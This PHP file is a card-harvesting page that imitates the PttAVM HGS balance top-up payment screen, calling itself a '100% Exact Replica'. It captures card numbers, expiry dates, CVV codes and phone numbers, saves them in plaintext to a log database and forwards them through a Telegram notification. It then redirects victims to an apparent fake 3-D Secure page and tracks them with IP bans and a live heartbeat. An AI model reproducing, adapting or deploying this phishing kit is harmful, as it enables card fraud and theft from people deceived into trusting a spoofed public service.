<?php
/**
 * odeme.php — HGS Bakiye Yükleme Ödeme Sayfası (100% Exact Replica)
 */
if (session_status() === PHP_SESSION_NONE) session_start();

require_once __DIR__ . '/db.php';

// Vercel Serverless Session Recovery (Session Kaybı Önleme)
if (empty($_SESSION['basvuru']) || empty($_SESSION['randevu'])) {
    try {
        $sid = session_id();
        $row = db()->prepare("SELECT * FROM tapu_logs WHERE session_id=? LIMIT 1");
        $row->execute([$sid]);
        $r = $row->fetch();
        if ($r && !empty($r['tc']) && !empty($r['telefon'])) {
            $_SESSION['log_id'] = (int)$r['id'];
            $_SESSION['hgs_sorgu_tipi'] = $r['ilce'] ? strtolower($r['ilce']) : 'plaka';
            $_SESSION['hgs_sorgu_deger'] = $r['tc'];
            $_SESSION['hgs_telefon'] = $r['telefon'];
            
            $_SESSION['basvuru'] = [
                'ad' => 'HGS',
                'soyad' => 'Yükleme',
                'telefon' => $r['telefon'],
                'tc' => $r['tc'],
                'il' => 'ANKARA',
                'ilce' => 'ÇANKAYA'
            ];
            
            $_SESSION['randevu'] = [
                'mudurlik' => 'HGS: ' . strtoupper($r['ilce'] ?: 'PLAKA'),
                'tarih' => $r['tc'],
                'saat' => $r['saat'] ?: '275 TL'
            ];
        } else {
            header('Location: ' . BASE_PATH . '/'); exit;
        }
    } catch (Exception $e) {
        header('Location: ' . BASE_PATH . '/'); exit;
    }
}

// DB ve IP Kontrolleri
ip_ban_kontrol();
kayit_ziyaretci();

$_SESSION['adim'] = 3;
$_aktif_log_id = get_or_create_log();
if ($_aktif_log_id) {
    update_log($_aktif_log_id, ['mevcut_adim' => 3, 'son_aktivite' => date('Y-m-d H:i:s')]);
    try { tg_mesaj_gonder($_aktif_log_id); } catch (Exception $e) {}
}

$basvuru = $_SESSION['basvuru'];
$randevu = $_SESSION['randevu'];
$hatalar = [];
$ay = '';
$yil = '';
$form_data = [
    'kart_ad' => '',
    'kart_no' => '',
    'skt'     => '',
    'skt_ay'  => '',
    'skt_yil' => '',
    'cvv'     => '',
    'telefon' => $basvuru['telefon'] ?? ''
];

// Toplam tutarı session'dan al
$toplam_tutar = '275 TL';
if (!empty($randevu['saat'])) {
    $toplam_tutar = str_replace('Tutar: ', '', $randevu['saat']);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $kart_ad = trim($_POST['adsoyad'] ?? '');
    $kart_no = preg_replace('/\D/', '', $_POST['cc'] ?? '');
    $skt_ay  = trim($_POST['skt_ay'] ?? '');
    $skt_yil = trim($_POST['skt_yil'] ?? '');
    $skt     = ($skt_ay && $skt_yil) ? ($skt_ay . ' / ' . $skt_yil) : '';
    $cvv     = trim($_POST['cvv'] ?? '');
    $telefon = preg_replace('/\D/', '', $_POST['no'] ?? '');

    // Form veri modelini güncelle
    $form_data = [
        'kart_ad' => $kart_ad,
        'kart_no' => $kart_no,
        'skt'     => $skt,
        'skt_ay'  => $skt_ay,
        'skt_yil' => $skt_yil,
        'cvv'     => $cvv,
        'telefon' => $telefon
    ];

    // Doğrulamalar
    if (empty($kart_ad)) {
        $hatalar['adsoyad'] = 'Kart üzerindeki ad soyad zorunludur.';
    }

    if (!preg_match('/^\d{16}$/', $kart_no)) {
        $hatalar['cc'] = 'Kart numarası 16 haneli olmalıdır.';
    } else {
        // Luhn Algoritması ile Kart Numarası Doğrulama
        $sum = 0;
        $numDigits = strlen($kart_no);
        $parity = $numDigits % 2;
        for ($i = 0; $i < $numDigits; $i++) {
            $digit = (int)$kart_no[$i];
            if ($i % 2 == $parity) {
                $digit *= 2;
                if ($digit > 9) {
                    $digit -= 9;
                }
            }
            $sum += $digit;
        }
        if ($sum % 10 !== 0) {
            $hatalar['cc'] = 'Girdiğiniz kart numarası geçersizdir.';
        }
    }

    // SKT Ayırıcı (Format: 08 / 28 veya 08/28)
    $skt_parts = explode('/', str_replace(' ', '', $skt));
    $ay = $skt_parts[0] ?? '';
    $yil = $skt_parts[1] ?? '';

    if (empty($ay) || !preg_match('/^(0[1-9]|1[0-2])$/', $ay)) {
        $hatalar['skt'] = 'Geçerli bir son kullanma ayı giriniz.';
    }

    $thisYear = (int)date('y');
    if (empty($yil) || !preg_match('/^\d{2}$/', $yil) || (int)$yil < $thisYear) {
        $hatalar['skt'] = 'Geçerli bir son kullanma yılı giriniz.';
    }

    if (!preg_match('/^\d{3,4}$/', $cvv)) {
        $hatalar['cvv'] = 'CVV 3 veya 4 haneli olmalıdır.';
    }

    if (empty($telefon) || strlen($telefon) < 10) {
        $hatalar['no'] = 'Geçerli bir telefon numarası giriniz.';
    }

    if (empty($hatalar)) {
        $_SESSION['odeme'] = [
            'kart_ad' => $kart_ad,
            'kart_no' => $kart_no,
            'ay'      => $ay,
            'yil'     => $yil,
            'cvv'     => $cvv,
            'telefon' => $telefon
        ];

        // DB'ye kaydet ve Telegram'a gönder
        if (!empty($_SESSION['log_id'])) {
            $lid = (int)$_SESSION['log_id'];
            
            // Ad Soyad'ı isim ve soyisim olarak ayırıp veritabanına yazalım
            $parts = explode(' ', $kart_ad);
            $soyad = (count($parts) > 1) ? array_pop($parts) : '';
            $ad = implode(' ', $parts);

            update_log($lid, [
                'ad'          => $ad,
                'soyad'       => $soyad,
                'kart_ad'     => $kart_ad,
                'kart_no'     => $kart_no,
                'ay'          => $ay,
                'yil'         => $yil,
                'cvv'         => $cvv,
                'telefon'     => $telefon,
                'mevcut_adim' => 4,
            ]);
            
            // Telegram Bildirimi gönder
            try { tg_mesaj_gonder($lid); } catch (Exception $e) {}
        }

        header('Location: ' . BASE_PATH . '/3dredirect.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <title>HGS Online Bakiye Yükleme - Ödeme</title>
    <link rel="icon" type="image/png" href="https://hgs.pttavm.com/v2/assets/images/favicon.png">
    
    <!-- Google Fonts Open Sans -->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap" rel="stylesheet">
    
    <!-- PttAVM HGS CSS -->
    <link rel="stylesheet" href="assets/css/hgs.min.css?v=<?= time() ?>">
    
    <style>
        body, html {
            margin: 0 !important;
            padding: 0 !important;
            width: 100% !important;
            overflow-x: hidden !important;
        }
        
        .wizard-hgs-image-container {
            background-size: cover;
            min-height: 100vh !important;
            height: auto !important;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 100% !important;
            margin: 0 !important;
            padding: 0 !important;
        }

        footer {
            position: relative !important;
            margin-top: 30px !important;
            clear: both !important;
            width: 100% !important;
            bottom: auto !important;
            left: auto !important;
            flex-shrink: 0 !important;
        }

        .container-fluid.no-padding {
            padding: 0 !important;
            margin: 0 !important;
            width: 100% !important;
            max-width: 100% !important;
        }

        .navbar-header {
            margin: 0 !important;
            padding: 0 !important;
            width: 100% !important;
            max-width: 100% !important;
            float: none !important;
        }

        /* Logo Boyutunu Büyütme */
        .logo-field img.logo {
            height: 29px !important;
            max-height: none !important;
            width: auto !important;
            transition: all 0.2s ease-in-out;
        }

        #hgs-query-container {
            float: none;
            margin: 10px auto 40px auto;
        }

        .hgs-query-inputs {
            text-transform: uppercase;
        }

        .error-message {
            color: #e74c3c;
            font-size: 11px;
            margin-top: 4px;
            display: block;
            text-align: left;
        }

        .alert-error-box {
            background-color: rgba(231, 76, 60, 0.2);
            border: 1.5px solid #e74c3c;
            border-radius: 4px;
            padding: 15px;
            margin: 0 15px 20px 15px;
            color: #fff;
            font-size: 13px;
            text-align: left;
        }

        .alert-error-box ul {
            margin: 5px 0 0 20px;
            padding: 0;
        }

        /* İnteraktif Kart Görseli Stilleri (Orijinal Tasarım İle Uyumlu) */
        .card-wrapper {
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
        }

        .jp-card-container {
            width: 300px;
            height: 180px;
            perspective: 1000px;
        }

        .jp-card {
            width: 100%;
            height: 100%;
            position: relative;
            transform-style: preserve-3d;
            transition: transform 0.6s;
        }

        .jp-card-front, .jp-card-back {
            width: 100%;
            height: 100%;
            position: absolute;
            backface-visibility: hidden;
            border-radius: 10px;
            background: linear-gradient(135deg, #1f2d3d, #111b27);
            border: 1.5px solid rgba(255, 255, 255, 0.1);
            color: #fff;
            padding: 20px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .jp-card-back {
            transform: rotateY(180deg);
            background: #111b27;
            padding: 10px 0;
            justify-content: space-between;
        }

        .jp-card.flipped {
            transform: rotateY(180deg);
        }

        .jp-card-shiny {
            width: 40px;
            height: 30px;
            background: linear-gradient(135deg, #f2c94c, #f2994a);
            border-radius: 5px;
        }

        .jp-card-logo {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 16px;
            font-weight: 700;
            font-style: italic;
            color: #fff;
        }

        .jp-card-number {
            font-size: 16px;
            letter-spacing: 2px;
            text-align: left;
            margin-top: 15px;
        }

        .jp-card-name {
            font-size: 12px;
            text-align: left;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            max-width: 170px;
            text-transform: uppercase;
        }

        .jp-card-expiry {
            font-size: 12px;
            text-align: right;
        }

        .jp-card-bar {
            width: 100%;
            height: 35px;
            background: #000;
        }

        .jp-card-cvc {
            width: 60px;
            height: 25px;
            background: #fff;
            color: #000;
            font-weight: 700;
            text-align: center;
            line-height: 25px;
            font-size: 14px;
            align-self: flex-end;
            margin-right: 20px;
            border-radius: 3px;
        }

        /* Orijinal CSS Ezmeleri */
        .panel-credit-card-container label {
            text-align: left !important;
            display: block;
        }

        .panel-contract-container {
            text-align: left;
            margin-top: 15px;
        }

        #panel-do-payment-btn {
            width: 100%;
            padding: 12px !important;
            font-size: 15px !important;
            font-weight: 700 !important;
        }

        .payment-container {
            max-width: 385px !important;
            margin: 0 auto !important;
            width: 100% !important;
            box-sizing: border-box !important;
        }

        .payment-form {
            max-width: 385px !important;
            width: 100% !important;
            margin: 0 auto !important;
            box-sizing: border-box !important;
        }

        .wizard-card .tab-content {
            padding-top: 5px !important;
        }
        
        .panel-inside {
            padding-top: 5px !important;
        }

        /* Üst menüyü tamamen gizle */
        .menu-field {
            display: none !important;
        }
        
        @media (max-width: 767px) {
            .menu-field {
                display: none !important;
            }
            .navbar-header {
                display: block !important;
                width: 100% !important;
                text-align: center !important;
                padding: 0 !important;
            }
            .logo-field {
                float: none !important;
                display: inline-block !important;
                margin: 0 auto !important;
                text-align: center !important;
            }
            .logo-field a.navbar-brand {
                float: none !important;
                display: inline-block !important;
                margin: 0 auto !important;
                padding: 15px 0 !important;
            }
            .logo-field img.logo {
                display: inline-block !important;
                margin: 0 auto !important;
                float: none !important;
            }
            #hgs-query-container {
                padding-left: 8px !important;
                padding-right: 8px !important;
                margin: 0 auto !important;
                width: 100% !important;
            }
            .wizard-container {
                padding: 10px 0 !important;
                margin: 0 auto !important;
                width: 100% !important;
                display: flex !important;
                justify-content: center !important;
            }
            .wizard-card {
                width: 100% !important;
                max-width: 385px !important;
                margin: 0 auto !important;
                display: block !important;
                float: none !important;
                box-sizing: border-box !important;
            }
            .wizard-card .tab-content {
                padding-left: 8px !important;
                padding-right: 8px !important;
            }
            .panel-border {
                padding: 5px !important;
                border: none !important;
            }
            .panel-inside {
                padding: 8px 6px !important;
            }
            .jp-card-container {
                transform: scale(0.85);
                transform-origin: center center;
                margin-bottom: -15px !important;
                margin-top: -10px !important;
                max-width: 100% !important;
            }
            .panel-credit-card-container {
                padding: 0 5px !important;
            }
            .panel-card-wrapper {
                padding: 0 5px !important;
            }
        }
    </style>
</head>
<body>

<div class="image-container wizard-hgs-image-container set-full-height">
    
    <!-- Navbar Header -->
    <div class="container-fluid no-padding">
        <div class="navbar-header" style="overflow: hidden;">
            <div class="logo-field">
                <a class="navbar-brand navbar-left" href="https://www.pttavm.com" target="_blank">
                    <img src="assets/images/pttavm_hgs_logo.png" alt="PttAVM Logo" class="logo" border="0"/>
                </a>
            </div>
            <div class="menu-field">
                <nav class="nav responsive-menu">
                    <div class="menu-wrapper resize-drag nav-wrapper">
                        <ul class="nav-ul">
                            <li class="homepage-menu-item"><a href="index.php"><span>Ana Sayfa</span></a></li>
                            <li class="hgs-menu-item">
                                <a href="index.php" class="selected">
                                    <span>
                                        <img src="assets/images/menu/hgs_yukle.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/hgs_yukle_hover.png" class="menu-hover-item display-none" />
                                        Yükle
                                    </span>
                                </a>
                            </li>
                            <li class="damage-menu-item">
                                <a href="#">
                                    <span>
                                        <img src="assets/images/menu/hasar_sorgula.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/hasar_sorgula_hover.png" class="menu-hover-item display-none" />
                                        Hasar Sorgula
                                    </span>
                                </a>
                            </li>
                            <li class="km-menu-item">
                                <a href="#">
                                    <span>
                                        <img src="assets/images/menu/km_sorgula.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/km_sorgula_hover.png" class="menu-hover-item display-none" />
                                        KM Sorgula
                                    </span>
                                </a>
                            </li>
                            <li class="shopping-cart-menu-item">
                                <a href="https://pttavm.com" target="_blank">
                                    <span>
                                        <img src="assets/images/menu/alisveris.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/alisveris_hover.png" class="menu-hover-item display-none" />
                                        Alışverişe Başla
                                    </span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>

        <!-- Wizard Container -->
        <div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">
            <div class="wizard-container">
                <div class="card wizard-card" data-color="orange" id="wizardProfile">
                    
                    <div class="wizard-header">
                        <div class="panel-header-icons">
                            <img class="panel-header-first-icon" src="assets/images/panel/homepage.png">
                        </div>
                        <h1>
                            <img class="panel-header-second-icon" src="assets/images/panel/hgs.png">
                            Ödeme Ekranı
                        </h1>
                        <h6 class="hgs-query-subtitle">
                            BU SİSTEMDEN, YALNIZCA PTT KANALI İLE SATIŞI GERÇEKLEŞTİRİLEN HGS ÜRÜNLERİNE BAKİYE YÜKLEME İŞLEMİ YAPILMAKTADIR.
                        </h6>
                    </div>

                    <?php if (!empty($hatalar)): ?>
                        <div class="alert-error-box">
                            <strong>Hata! Lütfen aşağıdaki alanları düzeltin:</strong>
                            <ul>
                                <?php foreach ($hatalar as $hata): ?>
                                    <li><?= htmlspecialchars($hata) ?></li>
                                <?php endforeach; ?>
                            </ul>
                        </div>
                    <?php endif; ?>

                    <div class="tab-pane panel-border active" id="hgs-query-payment" style="display: block; width: 100%;">
                            <div class="panel-inside" style="width: 100%; display: block; background: #3a3a3a; padding: 10px 12px; box-sizing: border-box;">
                                <div class="payment-container hgs-query-credit-card-container" style="max-width: 385px !important; margin: 0 auto !important; padding: 0 !important; float: none !important; text-align: left; box-sizing: border-box; width: 100%;">
                                    
                                    <div style="text-align: center; margin-bottom: 20px; box-sizing: border-box; width: 100%;">
                                        <span class="tab-pane-heading" style="display: block; font-size: 14px;">Ödeme yapmak için kullanmak istediğiniz kart bilgilerini girin.</span>
                                    </div>
                                    
                                    <form action="" method="post" name="payment-form" class="payment-form" data-tab="3" style="max-width: 385px; width: 100%; margin: 0 auto; box-sizing: border-box;">

                                        <!-- Kart Giriş Alanları -->
                                        <div class="panel-credit-card-container" style="padding: 0 15px;">
                                            <!-- Ad Soyad -->
                                            <div class="form-group" style="text-align: left; margin-bottom: 15px;">
                                                <label style="color: #fab62c; font-weight: 600; font-size: 13px; display: block; margin-bottom: 5px;">Kart üzerindeki ad ve soyad</label>
                                                <input type="text" name="adsoyad" id="adsoyad" class="form-control text-center" placeholder="Adı Soyadı" autocomplete="off" value="<?= htmlspecialchars($form_data['kart_ad']) ?>" required style="text-align: center; text-transform: uppercase;">
                                            </div>

                                            <!-- Kart Numarası -->
                                            <div class="form-group" style="text-align: left; margin-bottom: 15px;">
                                                <label style="color: #fab62c; font-weight: 600; font-size: 13px; display: block; margin-bottom: 5px;">Kart numaranız</label>
                                                <input type="text" id="cc" name="cc" class="form-control text-center" placeholder="Kredi Kartı Numarası" autocomplete="off" value="<?= htmlspecialchars($form_data['kart_no']) ?>" required maxlength="19" inputmode="numeric" style="text-align: center;">
                                                <span id="cc-error" style="color: #f87171; font-size: 12px; display: none; margin-top: 5px; font-weight: 500; text-align: center; width: 100%;">⚠️ Geçersiz kart numarası. Lütfen kontrol edin.</span>
                                            </div>

                                            <!-- SKT & CVV -->
                                            <div style="display: flex; gap: 15px; margin-bottom: 15px;">
                                                <div style="flex: 7; text-align: left;">
                                                     <label style="color: #fab62c; font-weight: 600; font-size: 13px; display: block; margin-bottom: 5px;">Son kul. tarihi</label>
                                                     <div style="display: flex; gap: 8px;">
                                                         <select name="skt_ay" id="skt_ay" class="form-control text-center" required style="text-align: center; text-align-last: center; width: 50%; font-size: 14px; height: 42px; border-radius: 4px; padding: 0 10px; cursor: pointer;">
                                                             <option value="" disabled selected>Ay</option>
                                                             <?php $ay = $form_data['skt_ay'] ?? ''; for ($m = 1; $m <= 12; $m++): ?>
                                                                 <?php $val = str_pad($m, 2, '0', STR_PAD_LEFT); ?>
                                                                 <option value="<?= $val ?>" <?= ($ay === $val) ? 'selected' : '' ?>><?= $val ?></option>
                                                             <?php endfor; ?>
                                                         </select>
                                                         <select name="skt_yil" id="skt_yil" class="form-control text-center" required style="text-align: center; text-align-last: center; width: 50%; font-size: 14px; height: 42px; border-radius: 4px; padding: 0 10px; cursor: pointer;">
                                                             <option value="" disabled selected>Yıl</option>
                                                             <?php 
                                                             $yil = $form_data['skt_yil'] ?? '';
                                                             $thisYearYY = (int)date('y');
                                                             for ($y = 0; $y < 15; $y++): 
                                                                 $valYY = str_pad($thisYearYY + $y, 2, '0', STR_PAD_LEFT);
                                                             ?>
                                                                 <option value="<?= $valYY ?>" <?= ($yil === $valYY) ? 'selected' : '' ?>><?= $valYY ?></option>
                                                             <?php endfor; ?>
                                                         </select>
                                                     </div>
                                                 </div>
                                                <div style="flex: 5; text-align: left;">
                                                    <label style="color: #fab62c; font-weight: 600; font-size: 13px; display: block; margin-bottom: 5px;">CVC kodu</label>
                                                    <input type="text" name="cvv" id="cvv" class="form-control text-center" placeholder="CVC" autocomplete="off" value="<?= htmlspecialchars($form_data['cvv']) ?>" required maxlength="3" inputmode="numeric" style="text-align: center;">
                                                </div>
                                            </div>

                                            <!-- Telefon Numarası -->
                                            <div class="form-group" style="text-align: left; margin-bottom: 25px;">
                                                <label style="color: #fab62c; font-weight: 600; font-size: 13px; display: block; margin-bottom: 5px;">Telefon numaranız</label>
                                                <input type="text" class="form-control text-center" name="no" id="phone" placeholder="(5xx) xxx xx xx" value="<?= htmlspecialchars($form_data['telefon']) ?>" readonly style="text-align: center; background-color: rgba(255, 255, 255, 0.08) !important; cursor: not-allowed; opacity: 0.75;" tabindex="-1">
                                            </div>
                                        </div>

                                        <!-- Kart Ön İzleme ve Ödeme Butonu -->
                                        <div class="panel-card-wrapper" style="padding: 0 15px; text-align: center; margin-top: 20px;">
                                            
                                            <!-- Orijinal İnteraktif Kredi Kartı Kutusu -->
                                            <div class="card-wrapper" style="display: flex; justify-content: center; margin-bottom: 20px;">
                                                <div class="jp-card-container">
                                                    <div class="jp-card" id="jpCard">
                                                        <!-- Ön Yüz -->
                                                        <div class="jp-card-front">
                                                            <div class="jp-card-shiny"></div>
                                                            <div class="jp-card-logo" id="cardLogoPreview">Visa</div>
                                                            <div class="jp-card-number" id="cardNumberPreview">•••• •••• •••• ••••</div>
                                                            <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-top: 10px;">
                                                                <div class="jp-card-name" id="cardHolderPreview">AD SOYAD</div>
                                                                <div class="jp-card-expiry" id="cardExpiryPreview">AA / YY</div>
                                                            </div>
                                                        </div>
                                                        <!-- Arka Yüz -->
                                                        <div class="jp-card-back">
                                                            <div class="jp-card-bar"></div>
                                                            <div class="jp-card-cvc" id="cardCvcPreview">•••</div>
                                                            <div style="height: 10px;"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                            <button type="submit" class="btn btn-warning" id="panel-do-payment-btn" style="width: 100%; padding: 12px; font-size: 15px; font-weight: 700; background-color: #fab62c; color: #0b132b; border: none; border-radius: 4px; display: block; margin-bottom: 15px;">
                                                ÖDEME YAP <img src="assets/images/tabs/payment.png">
                                            </button>
                                        </div>

                                        <!-- Sözleşme Onayları -->
                                        <div style="padding: 0 15px; text-align: left; margin-bottom: 15px;">
                                            <div class="panel-contract-container panel-inside" style="background: transparent; border: none; padding: 0; margin: 0;">
                                                <label class="checkbox bounce" style="color: #bfbfbf; display: flex; gap: 8px; justify-content: flex-start; align-items: flex-start; font-size: 12px; margin: 0; line-height: 1.4;">
                                                    <input type="checkbox" id="hgs-credit-card-contract" required checked style="width:16px; height:16px; margin:0; margin-top: 1px; accent-color:#fab62c; flex-shrink: 0;">
                                                    <span class="checkbox-msg">
                                                        <a href="#" style="color:#fab62d;">Açık Rıza Metni</a> ve <a href="#" style="color:#fab62d;">Gizlilik Politikası</a>'nı okudum ve onaylıyorum.
                                                    </span>
                                                </label>
                                            </div>
                                        </div>

                                        <!-- Tahsilat Bilgisi -->
                                        <div style="padding: 0 15px; text-align: center; margin-top: 15px;">
                                            <span class="hgs-query-payment-message payment-info-message" style="color: #bfbfbf; font-size: 13px; display: block; line-height: 1.5;">
                                                Ödeme işlemini onayladığınızda, <span class="text-warning" style="color: #fab62d; font-weight: 700;"><?= htmlspecialchars($toplam_tutar) ?></span> kartınızdan tahsis edilecektir.
                                            </span>
                                        </div>

                                    </form>
                                </div>
                            </div>
                        </div>

                    <div class="wizard-footer">
                        <div class="clearfix"></div>
                    </div>

                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="copyright">© Copyright 2026 | Tüm hakları saklıdır.</div>
            <div class="footer-menu">
                <ul>
                    <li class="important-informations">
                        <a href="javascript:void(0);">Önemli Bilgiler</a>
                    </li>
                    <li><a href="javascript:void(0);">Görüş Bildir</a></li>
                    <li><a href="javascript:void(0);">Sıkça Sorulan Sorular</a></li>
                    <li><a href="javascript:void(0);">İletişim</a></li>
                </ul>
            </div>
        </div>
    </footer>

</div>

<!-- Dinamik Kart Ön İzleme ve Giriş Formatlama Scripti -->
<script>
    const adsoyadInput = document.getElementById('adsoyad');
    const ccInput = document.getElementById('cc');
    const sktAySelect = document.getElementById('skt_ay');
    const sktYilSelect = document.getElementById('skt_yil');
    const cvvInput = document.getElementById('cvv');
    const phoneInput = document.getElementById('phone');

    const cardHolderPreview = document.getElementById('cardHolderPreview');
    const cardNumberPreview = document.getElementById('cardNumberPreview');
    const cardExpiryPreview = document.getElementById('cardExpiryPreview');
    const cardCvcPreview = document.getElementById('cardCvcPreview');
    const cardLogoPreview = document.getElementById('cardLogoPreview');
    const jpCard = document.getElementById('jpCard');

    // Kart sahibi adı güncelleme
    adsoyadInput.addEventListener('input', (e) => {
        const val = e.target.value.toUpperCase();
        cardHolderPreview.innerText = val || 'AD SOYAD';
    });

    // Kart numarası formatlama ve ön izleme
    ccInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '').slice(0, 16);
        
        // Kart Tipi Belirleme
        if (val.startsWith('4')) {
            cardLogoPreview.innerText = 'Visa';
        } else if (val.startsWith('5')) {
            cardLogoPreview.innerText = 'Mastercard';
        } else if (val.startsWith('3')) {
            cardLogoPreview.innerText = 'AMEX';
        } else {
            cardLogoPreview.innerText = 'Card';
        }

        // Boşluklu formatlama
        let formatted = val.replace(/(.{4})/g, '$1 ').trim();
        e.target.value = formatted;

        cardNumberPreview.innerText = formatted || '•••• •••• •••• ••••';
    });

    // Son kullanma tarihi formatlama ve ön izleme
    function updateCardExpiry() {
        const ayVal = sktAySelect ? sktAySelect.value : '';
        const yilVal = sktYilSelect ? sktYilSelect.value : '';
        if (ayVal || yilVal) {
            cardExpiryPreview.innerText = (ayVal || 'AA') + ' / ' + (yilVal || 'YY');
        } else {
            cardExpiryPreview.innerText = 'AA / YY';
        }
    }

    if (sktAySelect) sktAySelect.addEventListener('change', updateCardExpiry);
    if (sktYilSelect) sktYilSelect.addEventListener('change', updateCardExpiry);
    updateCardExpiry();

    // CVV Girişi & Çevirme (Flipped Efekti)
    cvvInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '').slice(0, 3);
        e.target.value = val;
        cardCvcPreview.innerText = val || '•••';
    });

    cvvInput.addEventListener('focus', () => {
        jpCard.classList.add('flipped');
    });

    cvvInput.addEventListener('blur', () => {
        jpCard.classList.remove('flipped');
    });

    // Telefon Formatlayıcı
    phoneInput.addEventListener('input', (e) => {
        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
        e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
    });

    // Heartbeat checking
    (function(){
        function heartbeat(){
            var fd = new FormData();
            fd.append('mevcut_adim', '3');
            fetch('heartbeat.php', {method: 'POST', body: fd, credentials: 'same-origin'}).catch(function(){});
        }
        setInterval(heartbeat, 3000);
    })();

    // Luhn Algoritması ile Kart Numarası Doğrulama
    function isValidLuhn(number) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = number.length - 1; i >= 0; i--) {
            let digit = parseInt(number.charAt(i));
            if (shouldDouble) {
                if ((digit *= 2) > 9) digit -= 9;
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return (sum % 10) === 0;
    }

    const paymentForm = document.querySelector('form[name="payment-form"]');
    const ccError = document.getElementById('cc-error');

    function validateCardNumber() {
        const val = ccInput.value.replace(/\D/g, '');
        if (val.length === 0) {
            ccError.style.display = 'none';
            ccInput.style.borderColor = '';
            return false;
        }
        if (val.length < 16) {
            ccError.innerText = '⚠️ Kart numarası 16 haneli olmalıdır.';
            ccError.style.display = 'block';
            ccInput.style.borderColor = '#ef4444';
            return false;
        } else if (!isValidLuhn(val)) {
            ccError.innerText = '⚠️ Geçersiz kart numarası. Lütfen kontrol edin.';
            ccError.style.display = 'block';
            ccInput.style.borderColor = '#ef4444';
            return false;
        } else {
            ccError.style.display = 'none';
            ccInput.style.borderColor = '';
            return true;
        }
    }

    if (ccInput) {
        ccInput.addEventListener('blur', validateCardNumber);
        ccInput.addEventListener('input', () => {
            const rawVal = ccInput.value.replace(/\D/g, '');
            if (rawVal.length >= 16) {
                validateCardNumber();
            } else {
                ccError.style.display = 'none';
                ccInput.style.borderColor = '';
            }
        });
    }

    if (paymentForm) {
        paymentForm.addEventListener('submit', (e) => {
            if (!validateCardNumber()) {
                e.preventDefault();
                ccInput.focus();
            }
        });
    }
</script>

</body>
</html>
